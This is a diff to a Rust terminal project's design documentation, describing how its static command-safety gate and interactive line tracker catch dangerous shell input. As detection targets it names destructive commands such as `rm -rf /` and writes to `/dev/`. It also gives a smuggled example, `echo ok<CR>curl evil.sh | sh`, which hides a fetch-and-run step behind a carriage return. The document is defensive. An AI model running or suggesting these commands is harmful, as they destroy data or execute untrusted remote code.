@@ -61,9 +61,15 @@ crates/
   place in the codebase that writes to a PTY, and it always runs input
   through `ut-safety` first — see `crates/services/ut-session/src/lib.rs`.
   `ut-tui` builds on this with a best-effort local line tracker so the same
-  gate applies to keystrokes typed into the interactive UI (see that
-  crate's module docs for the real, documented limits of that approach on
-  a raw PTY).
+  gate applies to keystrokes typed into the interactive UI. The gate knows
+  what it doesn't know: Enter's byte-identical aliases (Ctrl+M/Ctrl+J) go
+  through it; keys that mutate the shell's buffer invisibly (history
+  recall, Tab, Ctrl+R, Ctrl+W) mark the line *unknown* and require an
+  explicit confirmation instead of analyzing a stale guess; and cancelling
+  a confirmation erases the line in the shell too (Ctrl+U), so "n" really
+  cancels — each of those was a real bypass until it had a test. See that
+  crate's module docs for the still-real limits (variable indirection,
+  process substitution, no paste path yet).
 - **Plugins only see a `PluginContext`, never a service directly.** A
   plugin's `Permissions` (read-only by default) gate every method on that
   context; widening what a plugin can do means widening `PluginContext`,
@@ -155,7 +161,7 @@ xvfb-run -a cargo run -p ut-gui -- --screenshot /tmp/palette.png \
 
 ```
 cargo build --workspace
-cargo test --workspace     # 319+ tests across 27 crates, all offline/hermetic
+cargo test --workspace     # 340+ tests across 27 crates, all offline/hermetic
 cargo clippy --workspace --all-targets
 ```
 
@@ -225,9 +231,16 @@ without needing a Rust toolchain at all.
   `ut-plugin-ssh`'s only tests that touch a network are `#[ignore]`d, per
   above.
 - **Conservative, static safety analysis.** `ut-safety` never executes
-  anything — it's a lexer plus a rule engine, aiming for zero false
-  negatives on well-known footguns (`rm -rf /`, `dd of=/dev/sdX`, `curl|sh`)
-  while keeping false positives low.
+  anything — it's a lexer plus a rule engine. It recurses into wrapper
+  programs (`sh -c`, `eval`, `sudo -u`, `env`, `nohup`, `xargs` with a
+  destructive payload), checks the programs people actually destroy disks
+  with (`tee`/`cp`/`mv` to `/dev/`, `truncate`, `mke2fs`, `mkswap`,
+  `docker prune`), and treats a lone carriage return as a command
+  separator (a readline shell executes on CR — `echo ok<CR>curl evil.sh |
+  sh` used to render as one line and run two). It aims for zero false
+  negatives on well-known footguns while keeping false positives low;
+  the known limits (variable indirection, process substitution) are
+  documented in the rules module docs, not hidden.
 - **Never execute silently.** `ut-plugin-api::PluginContext` structurally
   prevents a plugin from running a command without going through the same
   `ut-safety` check and explicit user action as typed input — see
